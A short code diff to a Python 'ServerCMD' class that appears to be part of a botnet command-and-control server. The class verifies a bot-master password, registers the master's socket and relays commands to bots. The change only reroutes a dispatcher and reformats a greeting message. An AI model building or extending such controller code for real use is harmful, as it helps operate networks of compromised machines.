@@ -74,7 +74,8 @@ class ServerCMD(CMD):
     def recv_request_conn(self, client_sock, address):
         self.logger.info('receive request from addr: %s'%(str(address)))
         self.node.send(client_sock, 'connect_ack')
-        self.node.recv(client_sock, 512, self.dispatcher,
+        # self.node.recv(client_sock, 512, self.dispatcher,
+        self.node.recv(client_sock, 512, self.node.dispatcher,
                 threaded=True)
 
     def dispatcher(self, sock, data):
@@ -89,7 +90,9 @@ class ServerCMD(CMD):
         if data['password'][0] == BOT_MASTER_PASSWORD:
             self.logger.info( 'bot master password verfied' )
             self.node.set_master_sock(sock)
-            self.node.send(sock, 'verifed, hi master, what you want to do? ')
+            # self.node.send(sock, self._dump_json("{'msg':'verifed, hi master, what you want to do?'}"))
+            self.node.send(sock, self._cmd_to_json('event=echo;msg=verifed, hi master, what you want to do?'))
+
 
     def echo_bots(self, sock, data):
         self.logger.info('start to echo_bots' )
